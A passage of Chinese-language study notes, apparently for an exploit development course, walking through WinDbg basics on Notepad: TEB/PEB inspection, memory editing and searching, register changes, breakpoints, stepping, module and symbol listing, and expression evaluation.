      +0x008 StackLimit       : 0x004bc000 Void
      +0x00c SubSystemTib     : (null) 
      +0x010 FiberData        : 0x00001e00 Void
      +0x010 Version          : 0x1e00
      +0x014 ArbitraryUserPointer : (null) 
      +0x018 Self             : 0x00302000 _NT_TIB
         +0x000 ExceptionList    : 0x004bfb68 _EXCEPTION_REGISTRATION_RECORD
         +0x004 StackBase        : 0x004c0000 Void
         +0x008 StackLimit       : 0x004bc000 Void
         +0x00c SubSystemTib     : (null) 
         +0x010 FiberData        : 0x00001e00 Void
         +0x010 Version          : 0x1e00
         +0x014 ArbitraryUserPointer : (null) 
         +0x018 Self             : 0x00302000 _NT_TIB
   +0x01c EnvironmentPointer : (null) 
   +0x020 ClientId         : _CLIENT_ID
      +0x000 UniqueProcess    : 0x00001640 Void
      +0x004 UniqueThread     : 0x0000133c Void
   +0x028 ActiveRpcHandle  : (null) 
   +0x02c ThreadLocalStoragePointer : (null) 
   +0x030 ProcessEnvironmentBlock : 0x002ff000 _PEB
      +0x000 InheritedAddressSpace : 0 ''
      +0x001 ReadImageFileExecOptions : 0 ''
      +0x002 BeingDebugged    : 0x1 ''
      +0x003 BitField         : 0x4 ''
      +0x003 ImageUsesLargePages : 0y0
      +0x003 IsProtectedProcess : 0y0
      +0x003 IsImageDynamicallyRelocated : 0y1
      +0x003 SkipPatchingUser32Forwarders : 0y0
      +0x003 IsPackagedProcess : 0y0
      +0x003 IsAppContainer   : 0y0
      +0x003 IsProtectedProcessLight : 0y0
      +0x003 SpareBits        : 0y0
      +0x004 Mutant           : 0xffffffff Void
      +0x008 ImageBaseAddress : 0x010b0000 Void
      +0x00c Ldr              : 0x77baaaa0 _PEB_LDR_DATA
...
```

只顯示指定欄位
```dbg
0:000> dt ntdll!_TEB @$teb ThreadLocalStoragePointer
   +0x02c ThreadLocalStoragePointer : 0x02b31bf8 Void
```

>[!important]
>**TEB** 與 **PEB**
>- PEB：偏向 Process 層級的資訊
>- TEB：偏向個別 Thread 的資訊
>
>![image](https://hackmd.io/_uploads/Sy4a00Znzl.png)
>TEB 裡有一個 `ProcessEnvironmentBlock` 欄位，讓 Thread 可以取得所屬程序的 PEB\
>在 Exploit Development 中，PEB 常被用於理解模組載入資訊、程序環境等內容；TEB 則常用於分析執行緒、Stack 與 TLS 等資訊

取得結構大小 sizeof
```dbg
0:000> ?? sizeof(ntdll!_TEB)
unsigned int 0x1000
```
這份 _TEB 結構的大小為 0x1000 Bytes，也就是 4096 Bytes

若需要知道：
- 某個結構需要多少記憶體
- 結構的欄位偏移量是否落在預期範圍
- 程式傳給 API 的結構大小是否正確
- 記憶體配置和資料結構布局是否符合預期

### Writing to Memory
透過 WinDbg 的 Edit Memory 指令修改的是目標 Process 的記憶體

e* cmd 家族:
- eb	寫入 Byte
- ew	寫入 WORD（2 Bytes）
- ed	寫入 DWORD（4 Bytes）
- eq	寫入 QWORD（8 Bytes）
- ea	寫入 ASCII 字串
- eu	寫入 Unicode 字串

#### - 使用 ed 修改 ESP 指向的 DWORD
```dbg
0:000> dd esp L1
003cb710  00000000

0:000> ed esp 41414141

0:000> dd esp L1
003cb710  41414141
```
![image](https://hackmd.io/_uploads/B1QRl1M3ze.png)

#### - 使用 ea 寫入 ASCII 字串
使用 ea 寫入 ASCII 字串
```dbg
0:000> da esp
003cb710  ""

0:000> ea esp "Hello"

0:000> da esp
003cb710  "Hello"
```
![image](https://hackmd.io/_uploads/S1PBb1fnMx.png)

也可以利用 `eu` 寫入 Unicode 字串\
![image](https://hackmd.io/_uploads/H1GuGyGnzx.png)

### Searching the Memory Space
使用 `s` 指令搜尋記憶體
```dbg
s -d 0 L?80000000 41414141
```
> - `s`: Search，搜尋
> - `-d`: 將搜尋模式解讀為 DWORD
> - `0`: 搜尋起始位址
> - `L?80000000`: 指定搜尋範圍長度
> - `41414141`: 要搜尋的值

```dbg
0:000> ed esp 41414141

0:000> s -d 0 L?80000000 41414141
003cb710  41414141 0000006f 80000000 00000007  AAAAo...........
...
```
![image](https://hackmd.io/_uploads/HyGkJlG3Ge.png)
> WinDbg 在位址 `0x003CB710` 找到了符合條件的 DWORD
>> L?`80000000`
>> - `L` 表示指定長度。
>> - `?` 是 WinDbg 在此類長度運算式中使用的求值符號，用來計算後面的運算式。
>>- `80000000` 代表十六進位的 0x80000000 即 2 GiB\
>>指定 0x80000000 Bytes 的搜尋長度

搜尋 PE 檔案中常見的文字 (`-a` 以 ASCII 字串模式搜尋)
```dbg
0:000> s -a 0 L?80000000 "This program cannot be run in DOS mode"
000e004e  54 68 69 73 20 70 72 6f-67 72 61 6d 20 63 61 6e  This program can
007a004e  54 68 69 73 20 70 72 6f-67 72 61 6d 20 63 61 6e  This program can
0089004e  54 68 69 73 20 70 72 6f-67 72 61 6d 20 63 61 6e  This program can
008b004e  54 68 69 73 20 70 72 6f-67 72 61 6d 20 63 61 6e  This program can
009f004e  54 68 69 73 20 70 72 6f-67 72 61 6d 20 63 61 6e  This program can
00b6004e  54 68 69 73 20 70 72 6f-67 72 61 6d 20 63 61 6e  This program can
00b8004e  54 68 69 73 20 70 72 6f-67 72 61 6d 20 63 61 6e  This program can
00c1004e  54 68 69 73 20 70 72 6f-67 72 61 6d 20 63 61 6e  This program can
010b004e  54 68 69 73 20 70 72 6f-67 72 61 6d 20 63 61 6e  This program can
063610ae  54 68 69 73 20 70 72 6f-67 72 61 6d 20 63 61 6e  This program can
063626b6  54 68 69 73 20 70 72 6f-67 72 61 6d 20 63 61 6e  This program can
06368ebe  54 68 69 73 20 70 72 6f-67 72 61 6d 20 63 61 6e  This program can
...
```
![image](https://hackmd.io/_uploads/BkdwkgMnGl.png)

參數 | 用途 | 適合尋找的資料
:------:|:-------|:-------|
-b | Byte 模式 | 單一位元組或 Byte 序列
-w | WORD 模式 | 16-bit 數值
-d | DWORD 模式 | 32-bit 數值
-q | QWORD 模式 | 64-bit 數值
-a | ASCII 模式 | ASCII 字串
-u | Unicode 模式 | Unicode 字串

### Inspecting and Editing CPU Registers in WinDbg
檢視與修改 CPU 暫存器，在 x86 Exploit Development 中，Register 非常重要，因為 CPU 執行指令時會直接使用暫存器來存放資料、記憶體位址、運算結果和控制流程資訊
- EAX：常用於運算結果及函式回傳值
- ECX、EDX：常用於暫存資料及函式參數傳遞
- ESP：指向目前的 Stack 位置
- EBP：傳統函式 Stack Frame 常使用的基底指標
- EIP：指向目前執行流程中的指令位址
- ESI、EDI：常用於資料複製、字串操作等指令

#### -  r 查看所有暫存器
`r` 是 Register 指令，不加其他參數時會顯示目前 Thread 的主要暫存器狀態，以及 flag 暫存器等資訊
```dbg
0:000> r
eax=0008f24c ebx=00000006 ecx=0ad16828 edx=000f5e6c esi=0013f7d0 edi=00000006
eip=751c3b70 esp=0008f228 ebp=0008f25c iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200206
KERNELBASE!WriteFile:
751c3b70 6a18            push    18h

0:000> r ecx
ecx=0ad16828
```
![image](https://hackmd.io/_uploads/SJtdxeM3Gg.png)
> `r ecx` 只查看單一暫存器

修改暫存器的值
```dbg
0:000> r ecx=41414141

0:000> r
eax=0008f24c ebx=00000006 ecx=41414141 edx=000f5e6c esi=0013f7d0 edi=00000006
eip=751c3b70 esp=0008f228 ebp=0008f25c iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200206
KERNELBASE!WriteFile:
751c3b70 6a18            push    18h
```
> `ecx=41414141`

![image](https://hackmd.io/_uploads/ryE0glfhGl.png)

>[!important]
>`ed` 與 `r` 不同：
>![image](https://hackmd.io/_uploads/r1efZxznMg.png)\
>修改暫存器不是修改某個記憶體位址中的資料，而是直接改變 CPU 的暫存器狀態\
>在 WinDbg 暫停目標程序時，可以測試不同的執行條件，例如讓某個函式接收到不同的暫存器值，或者在受控的實驗中改變下一步的執行位置\
>不過，修改暫存器後，程式不一定能繼續正常執行。\
>Ex. ECX 原本存放有效的指標，卻被改成 0x41414141，而下一條指令又嘗試讀取 ecx，就可能導致存取違規

## Controlling the Program Execution in WinDbg
WinDbg 可以設定 [breakpoints](https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/methods-of-controlling-breakpoints)（bp / ba）來在程式碼中的特定位置暫停程式執行。檢查當下的暫存器、記憶體和反組譯指令，斷點有兩種類型：
- software breakpoints（bp）: 暫時修改目標程式碼中的指令，插入 INT 3
- processor/hardware breakpoints（ba）: 使用 CPU 的硬體除錯機制監控指定位置或資料存取

### Software Breakpoints
當使用 `bp` 設定中斷點時，WinDbg 會暫時將指定位置的第一個 opcode（ 替換成 INT 3 指令 (機器碼是：`CC`)\
當 CPU 執行到這個位置，就會產生中斷，讓 Debugger 接管。
WinDbg 會保存原本的指令內容，並在中斷點清除或程式繼續執行時，適當地還原與處理該指令。(Software Breakpoints 的優點是可以設定很多個)

選擇 Windows API [WriteFile](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-writefile) 設定中斷點，常用於將資料寫入檔案或其他 I/O 裝置

將 WinDbg 附加到 Notepad 確認程式已暫停，指定 kernel32.dll 模組\
`bl` 用來列出目前的中斷點
```dbg
0:005> bp kernel32!WriteFile

0:000> bl
     0 e Disable Clear  767ec6d0     0001 (0001)  0:**** KERNEL32!WriteFile
```
> - `0`：中斷點編號
> - `e`：目前啟用（Enabled）
> - `Disable`：表示可以停用此中斷點
> - `Clear`：表示可以清除此中斷點
> - `767ec6d0`：中斷點對應的位址
> - `KERNEL32!WriteFile`：目標函式

![image](https://hackmd.io/_uploads/H1ALFeGnfg.png)

在 Notepad 中輸入 Hello 並儲存觸發斷點\
可輸入 `g` Go 繼續執行程式
```dbg
0:005> g
Breakpoint 0 hit
eax=007bec80 ebx=00a9bb18 ecx=9e56da2d edx=00a9bb46 esi=00000017 edi=088f9630
eip=767ec6d0 esp=007bec60 ebp=007bec94 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200206
KERNEL32!WriteFile:
767ec6d0 ff2590448476    jmp     dword ptr [KERNEL32!_imp__WriteFile (76844490)] ds:0023:76844490={KERNELBASE!WriteFile (7466b160)}
```
在 debugging 過程中，可以用 `bd`（disable）和`be`（enable）指令來停用和啟用斷點
```dbg
0:000> bd 0

0:000> bl
     0 d Enable Clear  767ec6d0     0001 (0001)  0:**** KERNEL32!WriteFile
     
0:000> be 0

0:000> bl
     0 e Disable Clear  767ec6d0     0001 (0001)  0:**** KERNEL32!WriteFile
```
使用`bc`清除斷點編號，`bc *` 清除所有斷點
```dbg
0:000> bl
     0 e Disable Clear  767ec6d0     0001 (0001)  0:**** KERNEL32!WriteFile
     
0:000> bc 0

0:000> bl
```
![image](https://hackmd.io/_uploads/SyCrTlz2Ml.png)

###  Unresolved Function Breakpoint
若想監控的函式是一個尚未載入目標程序的 DLL

[環境範例]\
已經附加到 Notepad，想監控 ole32.dll 裡的 WriteStringStream。但 ole32.dll 尚未載入 Notepad 的程序空間\
👉🏻 可以使用 `bu` 設定尚未解析的函式中斷點\
不必手動等待 DLL 載入，也不必先知道函式最後會被載入到哪個位址

`lm m ole32` 先檢查 ole32 是否已載入
```dbg
0:005> lm m ole32
Browse full module list
start    end        module name

0:005> bu ole32!WriteStringStream

0:005> bl
     0 e Disable Clear u            0001 (0001) (ole32!WriteStringStream)
```
> u 表示這個中斷點尚未解析

在 Notepad 存檔觸發斷點，這個操作會讓 ole32.dll 載入
```dbg
0:005> g
[...]
ModLoad: 74ce0000 74dd7000   C:\Windows\System32\ole32.dll
[...]
```
透過中斷應用程式流程來確認斷點已解析
![image](https://hackmd.io/_uploads/HyKdJWf3Mx.png)
```dbg
(fac.fa4): Break instruction exception - code 80000003 (first chance)
eax=02d61000 ebx=00000000 ecx=76fb9bc0 edx=01008802 esi=76fb9bc0 edi=76fb9bc0
eip=76f81430 esp=0915fd44 ebp=0915fd70 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ntdll!DbgBreakPoint:
76f81430 cc              int     3
0:005> bl 
      0 e Disable Clear  74d01cd0     0001 (0001)  0:**** ole32!WriteStringStream
```
> 先用 bl 確認中斷點狀態 ole32.dll 已 loaded，但斷點未觸發 ⁉️\
> 是因為在記事本中的動作並未強制呼叫 `ole32!WriteStringStream`

### Breakpoint-Based Actions
不一定每次都要讓程式停下來。有時只想記錄某個 API 的參數，或只在特定條件成立時暫停
- `.printf`：格式化輸出。
- `.if / .else`：根據條件選擇要執行的指令
- `gc`：從條件中斷點繼續執行

在 WriteFile 觸發時自動列印參數
```
0:005> bp kernel32!WriteFile ".printf \"The number of bytes written is: %p\", poi(esp + 0x0C);.echo;g"
```
> - `bp kernel32!WriteFile`: 在 WriteFile 設定中斷點
> - `.printf`: 格式化輸出文字
> - `%p`: 	以指標格式顯示數值，通常呈現為十六進位
> - `poi(esp + 0x0C)`: 	讀取堆疊位址 ESP + 0x0C 的指標大小數值
> - `.echo`: 	輸出換行
> - `g`: 	繼續執行程式
> > 當中斷點觸發時，WinDbg 會自動列印數值，並接著繼續執行

WriteFile 的函式原型:
```
BOOL WriteFile(
  HANDLE       hFile,
  LPCVOID      lpBuffer,
  DWORD        nNumberOfBytesToWrite,
  LPDWORD      lpNumberOfBytesWritten,
  LPOVERLAPPED lpOverlapped
);
```
Windows x86 API 使用了 `__stdcall` 呼叫約定，其中函數參數以"從右到左"壓入堆疊。在這種情況下，每個參數在堆疊上佔用 4 bytes 的記憶體（在 Windows x86 中，Handles、pointers 和 dwords 都佔用 4 bytes）\
![image](https://hackmd.io/_uploads/SJB2g8z3fx.png)\
因此 `poi(esp + 0x0C)` 並不是讀取 ESP 暫存器本身，也不是讀取 ESP + 0x0C 這個位址數字，而是讀取 "該位址所存放的值" 👉🏻 nNumberOfBytesToWrite

設定好斷點後，使用g 讓應用程式繼續執行，然後在 NOtepad 中輸入字串並儲存
```dbg
0:005> g
...
The number of bytes written is: 00000003
The number of bytes written is: 00000006
The number of bytes written is: 00000012
```
不同次的 WriteFile 呼叫傳入了不同的寫入長度。
這次使用的參數名稱是 nNumberOfBytesToWrite，表示要求寫入的長度，不一定等於最後成功寫入的實際位元組數。\
若要確認實際寫入的數量，還要查看第四個參數 lpNumberOfBytesWritten 指向的輸出值，並考慮函式的回傳結果

設定條件中斷點 (只想在 WriteFile 的第三個參數恰好等於 4 時暫停，其餘情況都繼續執行)
```dbg
0:001> bp kernel32!WriteFile ".if (poi(esp + 0x0C) != 4) {gc} .else {.printf \"The number of bytes written is 4\";.echo;}"

0:001> g
```
> 1. 中斷點每次遇到 WriteFile 都會先執行條件判斷
> 2. poi(esp + 0x0C) != 4 表示要求寫入的位元組數不等於 4
> 3. 若條件成立，執行 {gc}，繼續執行程式
> 4. 若條件不成立，也就是數值等於 4，執行 .else 區塊
> 5. .else 區塊列印訊息，並讓除錯器保留暫停狀態，以便檢查現場
>
> 條件符合時，程式會停下來，供你檢查暫存器、堆疊與記憶體

在寫入長度等於 4 時暫停:
```dbg
The number of bytes written is 4
eax=002fe740 ebx=0081b3a8 ecx=dae4b044 edx=0081b3b0 esi=00000004 edi=068eb378
eip=7560c6d0 esp=002fe720 ebp=002fe754 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
KERNEL32!WriteFile:
7560c6d0 ff2590446675    jmp     dword ptr [KERNEL32!_imp__WriteFile (75664490)] ds:0023:75664490={KERNELBASE!WriteFile (742ab160)}
```

### Hardware Breakpoints
Software 中斷點使用 `bp`，會暫時把目標程式碼中的指令替換成 INT 3（機器碼 CC）。
Hardware 中斷點是由 CPU 的硬體除錯機制處理，相關設定儲存在處理器的 [Debug Registers](https://en.wikipedia.org/wiki/X86_debug_register)中

`ba` 命令可以監控三種存取類型：
- `e`：	Execute 執行指定位置的指令時觸發
- `r`：	Read 讀取指定記憶體範圍時觸發
- `w`：	Write：寫入指定記憶體範圍時觸發

🥚 x86 與 x64 架構一般只有四個硬體 debug registers，因此可同時使用的 Software breakpoint 數量有限。這與 Software 斷點能夠設定很多個不同

ba 基本格式是：`ba <存取類型> <大小（bytes）> <目標位址>`

在 kernel32!WriteFile 的入口位址設定執行型硬體中斷點
```dbg
0:000> ba e 1 kernel32!WriteFile

0:000> g
```
> - `ba`：設定硬體中斷點
> - `- e`：監控指令執行
> - `- 1`：指定 1 byte 的監控範圍
> - `kernel32!WriteFile`：目標函式

```dbg
Breakpoint 1 hit
eax=02e3ee20 ebx=02fb7ba0 ecx=55c78079 edx=02fb7be0 esi=00000020 edi=086ee1a8
eip=767ec6d0 esp=02e3ee00 ebp=02e3ee34 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200202
KERNEL32!WriteFile:
767ec6d0 ff2590448476    jmp     dword ptr [KERNEL32!_imp__WriteFile (76844490)] ds:0023:76844490={KERNELBASE!WriteFile (7466b160)}
```
結果和 Software breakpoint 很相似：都可以看到目前的暫存器、EIP 與反組譯指令\
差別在於，Hardware breakpoint 使用 CPU 的除錯機制，而不是在目標程式碼中插入 `INT 3`

[環境範例] 找出 Notepad 在修改文字時，哪一段程式碼寫入了字串所在的記憶體

#### 1. 準備一個不容易重複的字串
在 Notepad 輸入： `w00tw00t`，儲存檔案、關閉 Notepad
#### 2. 搜尋字串在記憶體中的位置

```dbg
0:002> s -a 0x0 L?80000000 w00tw00t

0:002> s -u 0x0 L?80000000 w00tw00t
03b2c768  0077 0030 0030 0074 0077 0030 0030 0074  w.0.0.t.w.0.0.t.
```
> - `-a`：ASCII 字串
> - `-u`：Unicode 字串
> - `0x0`：搜尋起始位址。
> - `L?80000000`：指定搜尋長度為 0x80000000 bytes (2 GiB)
> > 最重要的是 address: "03b2c768"
> > - w:	`77 00`
> > - 0:	`30 00`
> > - t:	`74 00`

#### 3. 對字串設定寫入型 Hardware Breakpoints
要監控 UTF-16LE 字串的第一個字元 w。這個字元占兩個 bytes，所以監控起始位址的 2 bytes 即可
```dbg
0:002> ba w 2 03b2c768

0:002> bl
     0 e Disable Clear  03b2c768 w 2 0001 (0001)  0:**** 
     
0:002> g
```
> - `ba`：設定 Hardware Breakpoints
> - `w`：監控寫入
> - `2`：監控 2 bytes
> - `03b2c768`：監控字串開頭的記憶體位址

`bl` & `g` 確認中斷點設定

#### 4. 修改字串並觀察中斷點
回到 Notepad，選取整個字串，將它替換成小寫字母 `a`，觸發 Breakpoint
```dbg
Breakpoint 0 hit
eax=03a5f861 ebx=03a5f884 ecx=00000000 edx=00000002 esi=03a5f8ec edi=03b2c768
eip=773c8a6c esp=03a5f824 ebp=03a5f82c iopl=0         nv up ei ng nz ac po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000293
msvcrt!memmove+0x19c:
773c8a6c 8a4601          mov     al,byte ptr [esi+1]        ds:0023:03a5f8ed=00
```
> 程式正在 msvcrt.dll 的 [memmove](https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/memmove-wmemmove?view=msvc-160) 函式附近執行

觸發 Hardware Breakpoints 的指令是 `mov byte ptr [edi],al`\
(msvcrt.dll 中 memmove 函數的一部份)\
![image](https://hackmd.io/_uploads/ryz78_fhfe.png)

將 AL 暫存器中的 1 byte 寫入由 EDI 指向的記憶體位置，這時可以輸入 `du edi`
```dbg
0:000> du edi
03b2c768  "a00tw00t"

0:000> bc * 

0:000> g
```
> 原本的字串已被修改成 `a00tw00t`
> - `bc *` 清除中斷點

>[!Tip]
>為什麼在 Notepad 已替換成 a，記憶體裡卻仍看到後面的 00tw00t？
>> 取決於應用程式如何處理文字變更。可以先理解為：畫面上文字的邏輯長度與底層緩衝區裡的殘留內容，不一定完全相同

Hardware Breakpoints 用於追蹤程式執行期間的記憶體變化，適用於：
- 監測數據修改
- 偵錯複雜程式
- 逆向工程和漏洞利用開發

### Stepping Through the Code
Hardware Breakpoints 找到值得觀察的位置；接下來的單步執行，開始理解程式從該位置開始如何運作

指令 | 功能 | 使用情境
:------:|:-------|:-------|
p | Step Over | 執行指令但略過函式內部的逐步追蹤
t | Step Into | 執行指令遇到函式呼叫時進入函式內部
pt | Step to next return | 執行到函式中的下一個返回位置
ph | Step to next branch | 執行到遇到分支、呼叫或返回等控制流程指令的位置

最重要的區別是 `p`(Step Over)  和 `t`(Step Into) 在遇到 call 時的行為

使用 `kernelbase!CreateFileW` 來觀察檔案儲存流程\
先在函式入口設定中斷點：
```dbg
bp kernelbase!CreateFileW
g
```
在 Notepad 儲存檔案，讓中斷點觸發\
指定偏移位置設定中斷點：
```dbg
bp kernelbase!CreateFileW+0x53
g
```
> `+0x53` 表示從 CreateFileW 符號對應的起始位址往後偏移 0x53 bytes\
> ⚠️ 不是第 53 條指令，因為 x86 指令長度不固定

#### - p 和 t 遇到 call 時的差別
使用 `t`，會進入 CreateFileInternal\
但使用 `p`，則會讓該函式執行完畢後，再停在呼叫者後面的下一條指令

```dbg
eax=003cadc0 ebx=00000007 ecx=0630b798 edx=80000000 esi=00000000 edi=0630b798
eip=74bb61f3 esp=003cadb8 ebp=003caddc iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200246
KERNELBASE!CreateFileW+0x53:
74bb61f3 ff7518          push    dword ptr [ebp+18h]  ss:0023:003cadf4=00000003

0:000> p
eax=003cadc0 ebx=00000007 ecx=0630b798 edx=80000000 esi=00000000 edi=0630b798
eip=74bb61f6 esp=003cadb4 ebp=003caddc iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200246
KERNELBASE!CreateFileW+0x56:
74bb61f6 ff7510          push    dword ptr [ebp+10h]  ss:0023:003cadec=00000007

0:000> p
eax=003cadc0 ebx=00000007 ecx=0630b798 edx=80000000 esi=00000000 edi=0630b798
eip=74bb61f9 esp=003cadb0 ebp=003caddc iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200246
KERNELBASE!CreateFileW+0x59:
74bb61f9 e812000000      call    KERNELBASE!CreateFileInternal (74bb6210)

0:000> t
eax=003cadc0 ebx=00000007 ecx=0630b798 edx=80000000 esi=00000000 edi=0630b798
eip=74bb6210 esp=003cadac ebp=003caddc iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200246
KERNELBASE!CreateFileInternal:
74bb6210 8bff            mov     edi,edi

0:000> p
eax=003cadc0 ebx=00000007 ecx=0630b798 edx=80000000 esi=00000000 edi=0630b798
eip=74bb61f9 esp=003cadb0 ebp=003caddc iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200246
KERNELBASE!CreateFileW+0x5e:
74bb61fe 8be5            mov     esp,ebp
```
 "step into" 和 "step over" 可以交錯使用

>[!note]
>懶人包：\
>- 想理解 API 內部實作：使用 `t`
>- 只想知道呼叫之後程式如何繼續：使用 `p`

#### - [pt](https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/pt--step-to-next-return-) (step to next return)：直接執行到返回位置
當已經進入一個函式，但不想逐條追蹤全部指令，可以使用 `pt`
```dbg
0:000> pt
eax=000007f8 ebx=00000007 ecx=226410a5 edx=00000000 esi=00000000 edi=0630b798
eip=74bb6580 esp=003cadac ebp=003caddc iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200246
KERNELBASE!CreateFileInternal+0x370:
74bb6580 c21000          ret     10h
```
最後停在 KERNELBASE!CreateFileInternal+0x370: ret 10h\
ret 10h 會從 Stack 取出返回位址並返回 Caller ，同時額外調整堆疊指標 0x10 bytes\
👉🏻 這裡的 pt 是讓程式繼續執行，直到遇到符合條件的返回位置

#### - [ph](https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/ph--step-to-next-branching-instruction-)：執行到下一個分支點
ph 不一定會跳入下一個函式。它是執行到下一個符合條件的控制流程位置後停止，接下來仍要檢查實際停下來的指令

![image](https://hackmd.io/_uploads/BJDN3df2fx.png)

## Additional WinDbg Features
WinDbg 其他常用的四類功能：
1. 列出模組與符號：知道目前程序載入哪些 DLL，以及函式位於哪個記憶體位址
2. 把 WinDbg 當計算機：計算位址差、偏移量與位元運算
3. 資料格式轉換：在十六進位、十進位、二進位及 ASCII 等表示法之間轉換
4. Pseudo Registers（偽暫存器）：暫存中間計算結果，避免複雜的運算式全部擠在一行

### Listing Modules and Symbols in WinDbg
使用 `lm` 列出已載入模組
```dbg
0:007> lm
start    end        module name
002b0000 002ef000   notepad    (deferred)             
611e0000 61236000   oleacc     (deferred)             
68a70000 68ae6000   efswrt     (deferred)             
69c30000 69c47000   MPR        (deferred)             
69ce0000 69d4c000   WINSPOOL   (deferred)   
[...]
```
> - `start`	模組載入後的起始虛擬位址
> - `end`	模組位址範圍的結束界線
> - `module name`	模組名稱
> - `(deferred)`	符號資訊尚未完整載入或解析

002b0000 002ef000 notepad 代表 Notepad 模組在這個 process 的虛擬位址空間中，從 0x002B0000 開始，結束界線為 0x002EF000\
(0x002EF000 - 0x002B0000 = 0x44000) \
0x44000 bytes 約 272 KiB

>[!Note]
>若只知道一個函式的記憶體位址：`74a81234`\
>只看到機器碼，無法直接知道用途\
>如果 WinDbg 有對應的符號資訊，就可能將 Address 解析成較有意義的名稱，Ex.`KERNEL32!CreateFileW`\
>Symbols 可以讓 Debugger 辨識函式名稱、部分型別資訊、結構與全域變數等資訊。Windows 的 PDB（Program Database）是常見的符號檔案格式。
因此，符號資訊可以大幅降低逆向分析時的理解成本

使用 `.reload /f` 強制載入符號
```dbg
0:007> .reload /f
Reloading current modules
...................................................

0:007> lm
start    end        module name
002b0000 002ef000   notepad    (pdb symbols)          c:\symbols\notepad.pdb\FB4FCA58AFCC3ACA154240CE7B7A58131\notepad.pdb
611e0000 61236000   oleacc     (pdb symbols)          c:\symbols\oleacc.pdb\170302085B3679B8C6F657898A44607E1\oleacc.pdb
68a70000 68ae6000   efswrt     (pdb symbols)          c:\symbols\efswrt.pdb\7E1B78CB6EF19B073B4F4A354501F7D31\efswrt.pdb
69c30000 69c47000   MPR        (pdb symbols)          c:\symbols\mpr.pdb\8E907DDAD5CCF1C8EE24214E569B592E1\mpr.pdb
69ce0000 69d4c000   WINSPOOL   (pdb symbols)          c:\symbols\winspool.pdb\6E59EFAE2D1C35E1E07A45A4EDE324681\winspool.pdb
[...]
```
> 原本顯示 (deferred) 的模組，可能變成：KERNELBASE (pdb symbols)
> - 載入模組：程式的 DLL 或 EXE 已經 image 到 process 的虛擬位址空間
> - 載入符號：WinDbg 取得並解析可用的符號資訊

若沒有可用的 PDB，WinDbg 也可能使用模組的 Export Symbols（匯出符號）。這些名稱來自 PE 檔案的 [Export Directory Table](https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#export-directory-table)，通常能辨識對外匯出的函式，但不等於取得完整的私有符號資訊

若只想列出特定模組：`lm m` (以 kernel 開頭的模組)
```dbg
0:007> lm m kernel*
Browse full module list
start    end        module name
73c70000 73c7e000   kernel_appcore   (pdb symbols)          c:\symbols\Kernel.Appcore.pdb\E809C8B1302B9976E49A0476E5D627491\Kernel.Appcore.pdb
73ce0000 73eb8000   KERNELBASE   (pdb symbols)          c:\symbols\kernelbase.pdb\13D9C53AB6F8551B30ABB78D4F9A1F8A1\kernelbase.pdb
74a80000 74b15000   KERNEL32   (pdb symbols)          c:\symbols\kernel32.pdb\EFA698598E9A5A3CB89EC02E7DE288041\kernel32.pdb
```

使用 [x](https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/x--examine-symbols-) 查詢函式符號，假設不記得 CreateProcess 相關函式的完整名稱，可以輸入 `x 模組名稱!符號名稱模式` (x kernelbase!CreateProc*)
```dbg
0:002> x kernelbase!CreateProc*
752362e4          KERNELBASE!CreateProcessExtensions::ErrorContext::LogError (<no parameter info>)
751f2670          KERNELBASE!CreateProcessAsUserA (<no parameter info>)
751ed550          KERNELBASE!CreateProcessAsUserW (<no parameter info>)
751d6ace          KERNELBASE!CreateProcessExtensions::IsDefaultBrowserCreation (<no parameter info>)
751ecba4          KERNELBASE!CreateProcessExtensions::ReleaseAppXContext (<no parameter info>)
751d7564          KERNELBASE!CreateProcessExtensions::VerifyParametersAndGetEffectivePackageMoniker (<no parameter info>)
752360e6          KERNELBASE!CreateProcessExtensions::CreateSharedLocalFolder (<no parameter info>)
751d6cb2          KERNELBASE!CreateProcessExtensions::PreCreationExtension (<no parameter info>)
751c1010          KERNELBASE!CreateProcessInternalW (<no parameter info>)
751c4ad0          KERNELBASE!CreateProcessA (<no parameter info>)
751c4e70          KERNELBASE!CreateProcessW (<no parameter info>)
751c3630          KERNELBASE!CreateProcessInternalA (<no parameter info>)
```
> - `A`：ANSI／窄字元版本。
> - `W`：Wide／寬字元版本，通常使用 UTF-16 編碼的 Windows 字串

### Using WinDbg as a Calculator
[?](https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/---evaluate-expression-) 指令可以直接在 WinDbg 中計算數值，尤其適合逆向工程中常見的位址差、偏移量與位元運算

```dbg
0:007> ? 77269bc0  - 77231430 
Evaluate expression: 231312 = 00038790
```
> 十進位：231312 & 十六進位：0x00038790
> > 若在逆向中找到兩個位址，可計算兩者相差多少 bytes

使用 >> 進行右移運算
```
0:007> ? 77269bc0 >> 18
Evaluate expression: 119 = 00000077
```
